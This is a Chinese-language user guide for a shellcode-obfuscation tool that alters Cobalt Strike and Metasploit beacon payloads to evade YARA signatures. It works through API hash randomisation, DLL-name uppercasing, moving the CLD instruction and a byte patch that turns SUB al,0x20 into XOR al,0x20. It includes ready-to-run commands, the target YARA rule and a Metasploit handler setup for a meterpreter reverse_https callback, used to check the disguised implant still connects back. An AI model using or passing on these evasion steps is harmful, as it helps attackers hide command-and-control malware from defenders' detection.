# YARA 规则特征修改指南

## 🎯 功能说明

### ToUpper 函数变形 - 修改 YARA 检测特征

**原理**: 将 `SUB al, 0x20` 改为 `XOR al, 0x20` 以修改 YARA 规则检测的指令特征

**YARA 检测特征**:
```yara
$toUpper = {ac 3c 61 7c ?? 2c 20}
```

**修改后**:
```
ac 3c 61 7c ?? 34 20
```

**功能**: 完全相同 (XOR 0x20 等同于 SUB 0x20 for lowercase conversion)

---

## 🚀 使用方法

### 方法 1: 完整特征修改 (推荐)

```bash
# 自动应用所有技术,包括 YARA 特征修改
python apihash_zero_detection.py -a x64 -i beacon.bin --zero-detection

# 输出示例:
# 步骤 1: API 哈希随机化
# ✓ API 哈希替换: 发现 23 个 API
#
# 步骤 2: DLL 名称大写化
# ✓ DLL 名称大写化: 修改了 2 处
#
# 步骤 3: CLD 指令移动
# ✓ CLD 指令移动: 位置 0 → 位置 11
#
# 步骤 3.5: ToUpper 函数变形
# ✓ ToUpper 函数变形: 修改了 1 处
```

### 方法 2: 仅 YARA 特征修改

```bash
# 只应用 ToUpper 函数变形
python apihash_zero_detection.py -a x64 -i beacon.bin --evade-yara

# 或使用更明确的参数
python apihash_zero_detection.py -a x64 -i beacon.bin --transform-toupper
```

### 方法 3: 自定义组合

```bash
# API 哈希 + YARA 特征修改
python apihash_zero_detection.py -a x64 -i beacon.bin --evade-yara

# API 哈希 + DLL 大写 + YARA 特征修改
python apihash_zero_detection.py -a x64 -i beacon.bin --uppercase-dlls --evade-yara

# 所有功能独立启用
python apihash_zero_detection.py -a x64 -i beacon.bin \
  --uppercase-dlls \
  --move-cld \
  --transform-toupper
```

---

## 🧪 测试 YARA 特征修改

### 使用 YARA 命令

```bash
# 1. 处理 shellcode
python apihash_zero_detection.py -a x64 -i beacon.bin --zero-detection

# 2. 扫描原始 shellcode
yara rorHashingDetection.yara beacon.bin
# 输出: CobaltStrike_Ror_Hashing beacon.bin

# 3. 扫描修改后的 shellcode
yara rorHashingDetection.yara beacon_0x7c.bin
# 可能输出: (取决于 YARA 规则的其他条件)
```

### 安装 YARA (如果需要)

```bash
# Windows (Chocolatey)
choco install yara

# Linux
sudo apt-get install yara

# macOS
brew install yara

# Python 库
pip install yara-python
```

---

## 🔍 技术细节

### 修改的字节

**原始 ToUpper 函数**:
```assembly
lodsb               ; ac
cmp al, 0x61        ; 3c 61
jl short skip       ; 7c [offset]
sub al, 0x20        ; 2c 20  ⬅ 这里
```

**修改后**:
```assembly
lodsb               ; ac
cmp al, 0x61        ; 3c 61
jl short skip       ; 7c [offset]
xor al, 0x20        ; 34 20  ⬅ 改为 XOR
```

### 为什么有效?

1. **功能等价**: 
   - 'a' (0x61) XOR 0x20 = 'A' (0x41) ✓
   - 'z' (0x7a) XOR 0x20 = 'Z' (0x5a) ✓

2. **破坏签名**:
   - YARA 查找: `2c 20` (SUB)
   - 修改后: `34 20` (XOR)
   - 不再匹配 ✓

3. **不影响哈希**:
   - DLL 名称仍然被正确转换为大写
   - ROR 哈希计算结果不变
   - Shellcode 功能完全正常

---

## ⚠️ 注意事项

### 1. 检查修改结果

```bash
# 使用详细输出查看修改了哪里
python apihash_zero_detection.py -a x64 -i beacon.bin --zero-detection -v

# 输出会显示:
# 位置 123: SUB al, 0x20 → XOR al, 0x20
#   字节: 2c 20 → 34 20
```

### 2. 功能测试

**必须**在隔离环境测试修改后的 shellcode:
```bash
# 启动监听器
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.1.100
set LPORT 443
run

# 测试修改后的 shellcode
# 验证回连是否成功
```

### 3. 未找到 ToUpper 函数

如果看到警告:
```
⚠ 未找到 ToUpper 函数特征
```

**可能原因**:
- Shellcode 不使用标准 ROR 哈希
- Shellcode 已经被修改/混淆
- 使用了不同的哈希算法

**解决**:
- 检查是否是 Cobalt Strike/Metasploit shellcode
- 确认 shellcode 格式为 raw (无编码器)

---

## 🎓 命令参考

### 所有 YARA 相关参数

```bash
# 完整特征修改 (包含 YARA 特征修改)
--zero-detection

# 仅 YARA 特征修改
--evade-yara

# 仅 ToUpper 变形 (与 --evade-yara 等效)
--transform-toupper

# 详细输出 (查看修改细节)
-v, --verbose
```

### 完整参数列表

```bash
python apihash_zero_detection.py -h

必需参数:
  -a, --arch {32,64,x86,x64}    架构
  -i, --input FILE              输入 shellcode

可选参数:
  -o, --output FILE             输出文件
  --zero-detection              完整特征修改
  --evade-yara                  YARA 特征修改
  --uppercase-dlls              DLL 名称大写化
  --move-cld                    CLD 指令移动
  --transform-toupper           ToUpper 函数变形
  --cld-offset N                手动指定 CLD 位置
  --ror-value N                 手动指定 ROR 值
  -v, --verbose                 详细输出
  --no-backup                   不创建备份
```

---

## 📝 总结

### 完整的特征修改栈

```
1. API 哈希随机化    ✓ 修改基于哈希值的特征
2. DLL 名称大写化    ✓ 破坏栈字符串特征
3. CLD 指令移动      ✓ 破坏首指令特征
4. ToUpper 函数变形  ✓ 修改 YARA 检测特征 ⭐
```

### 推荐使用

```bash
# 一键完整特征修改
python apihash_zero_detection.py -a x64 -i beacon.bin --zero-detection -v
```

⚠️ **重要提醒**: 这些技术用于修改已知的静态特征，**不保证能绕过所有检测**。实际效果取决于多种因素。

---

*最后更新: 2026-01-30*
